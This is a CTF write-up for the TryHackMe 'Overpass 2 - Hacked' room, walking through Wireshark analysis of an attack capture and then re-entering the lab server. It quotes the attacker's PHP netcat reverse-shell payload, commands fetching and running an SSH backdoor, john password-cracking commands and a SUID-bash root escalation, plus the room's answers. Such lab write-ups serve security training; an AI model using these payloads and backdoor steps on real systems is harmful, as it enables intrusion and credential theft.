---
title: Tryhackme - Overpass 2 - Hacked
layout: post
categories:
- TryHackMe
image: assets/img/overpass-2.png
image_alt: overpass-2
tag:
- security,
- forensics,
- wireshark
---

This was an easy Linux machine and the second in the Overpass TryHackMe series. It involved analyzing a capture file containing requests issued by an attacker to compromise the web server, escalate privileges to root and establish persistence, in order to understand the exact steps followed to do so, and then using that information to hack back into the host.

<br>

---

<br>
## 1. Forensics - Analyse the PCAP
Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.

Can you work out how the attacker got in, and hack your way back into Overpass' production server?

Note: Although this room is a walkthrough, it expects familiarity with tools and Linux. I recommend learning basic Wireshark and completing Linux Fundamentals as a bare minimum.

**`md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc`**

<br>
### 1.1 What was the URL of the page they used to upload a reverse shell?

Open the **`overpass2.pcapng`** file in Wireshark and analyze the **`HTTP`** traffic (enter http as filter).

![http](/assets/img/tryhackme/overpass-2/http.png)

Right-click on the first http frame and select **`“Follow > TCP Stream”`**. Here is the first request.

![tcp](/assets/img/tryhackme/overpass-2/tcp.png)

**Answer : `/development/`**

<br>
### 1.2 What payload did the attacker use to gain access?
Now, we are trying to find the reverse shell that the attacker has uploaded to the system. So we apply this filter.
```
$http.request.method == "POST"
```
And here it is,

![post](/assets/img/tryhackme/overpass-2/post.png)

Right-click on the HTTP frame and select **`“Follow > TCP Stream”`**. 

![payload](/assets/img/tryhackme/overpass-2/payload.png)

Answer : `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`

<br>
### 1.3 What password did the attacker use to privesc?
Now, **`CTRL+F`** to search. After that, we set the **`string`** and searching for requests containing **`passwords`**.

![string](/assets/img/tryhackme/overpass-2/string.png)

Now, requests that contain passwords from this search will appear marked.

![mark](/assets/img/tryhackme/overpass-2/marked.png)

We look at the TCP Stream and we have james' password.

![password](/assets/img/tryhackme/overpass-2/password.png)

**Answer: `whenevernoteartinstant`**

<br>
### 1.4 How did the attacker establish persistence?
Still in the same stream, scrolling down reveals that the attacker has downloaded an ssh backdoor to establish persistence.

![git](/assets/img/tryhackme/overpass-2/git.png)

**Answer: `https://github.com/NinjaJc01/ssh-backdoor`**

<br>
### 1.5 Using the fasttrack wordlist, how many of the system passwords were crackable?
In the same stream, the attacker dumped the content of the **`/etc/shadow`** file just before downloading the SSH backdoor.

![hosts](/assets/img/tryhackme/overpass-2/hosts.png)

Save the content in a file and crack it with **`John`** against the **`fasttrack`** wordlist to confirm how many passwords are crackable.

```
$ john --wordlist=/usr/share/wordlist/fasttrack.txt shadow.txt
```

![shadow](/assets/img/tryhackme/overpass-2/shadow.png)

**Answer: `4`**

<br>

---

<br>

## 2. Research - Analyse the Code 
Now that you’ve found the code for the backdoor, it’s time to analyse it.
<br>
### 2.1 What's the default hash for the backdoor?

Still, in the same stream, we see that the attacker executes the backdoor with the `-a` option, along with a `hash`.

![back](/assets/img/tryhackme/overpass-2/back.png)

What does the -a option do? Let's download the backdoor locally and check ourselves what this option is.

```
$ wget https://github.com/NinjaJc01/ssh-backdoor/raw/master/backdoor
$ chmod +x backdoor 
$ ./backdoor -h
```

![door](/assets/img/tryhackme/overpass-2/door.png)

As you can see here, if no hash is entered in the -a option, the tool itself uses a default hash.

**Answer: `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`**

<br>
### 2.2 What's the hardcoded salt for the backdoor?
Reading the source code of the backdoor ([https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go](https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go)), reveals that the salt is hardcoded.

![salt](/assets/img/tryhackme/overpass-2/salt.png)

**Answer: `1c362db832f3f864c8c2fe05f2002a05`**

<br>
### 2.3 What was the hash that the attacker used? - Go back to the PCAP for this!
We saw previously that the attacker used a custom hash.

![door](/assets/img/tryhackme/overpass-2/door.png)

**Answer: `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`**

<br>
### 2.4 Crack the hash using rockyou and a cracking tool of your choice. What's the password?

Analyzing the source code, we can see that the password is salted as follows.

![sha](/assets/img/tryhackme/overpass-2/sha.png)

The salt is appended to the password, and SHA512 of the resulting string makes the hash.
We create hash.txt and paste the following into it.

```
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05
```

![cat](/assets/img/tryhackme/overpass-2/cat.png)



Now, let’s crack it with john. As a format, we use `(sha512($pass.$salt))`.

```
$ john --format='dynamic=sha512($p.$s)' --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt
```

![hash](/assets/img/tryhackme/overpass-2/hash.png)

**Answer: `november16`**

<br>

---

<br>

## 3. Attack - Get back in!
Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.

There's flags on the box that Overpass can't afford to lose by formatting the server!

<br>
### 3.1 The attacker defaced the website. What message did they leave as a heading?
Let's do an nmap scan.

![nmap](/assets/img/tryhackme/overpass-2/nmap.png)

As we see here, 3 ports are open. One is **`HTTP:80`** and the others are **`SSH:22`**, **`SSH:2222`**.
Connect to port 80. The index page shows the following message.

![message](/assets/img/tryhackme/overpass-2/message.png)

**Answer: `H4ck3d by CooctusClan`**

<br>
### 3.2 Using the information you've found previously, hack your way back in!
It appears port 2222 is open. Logging in with the password cracked earlier. (november 16)

```
$ ssh 10.10.128.157 -p 2222 -oHostKeyAlgorithms=+ssh-rsa
```

![ssh](/assets/img/tryhackme/overpass-2/ssh.png)


<br>
### 3.3 What's the user flag?
```
$ cat /home/james/user.txt
```

![user](/assets/img/tryhackme/overpass-2/user.png)


<br>
### 3.4 What's the root flag?
There is a copy of bash in James’s home directory.

![bash](/assets/img/tryhackme/overpass-2/bash.png)


```
$ ./.suid_bash -p 
$ cat /root/root.txt
```

![root](/assets/img/tryhackme/overpass-2/root.png)

![root-flag](/assets/img/tryhackme/overpass-2/root-flag.png)

<br>

It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.

<br>
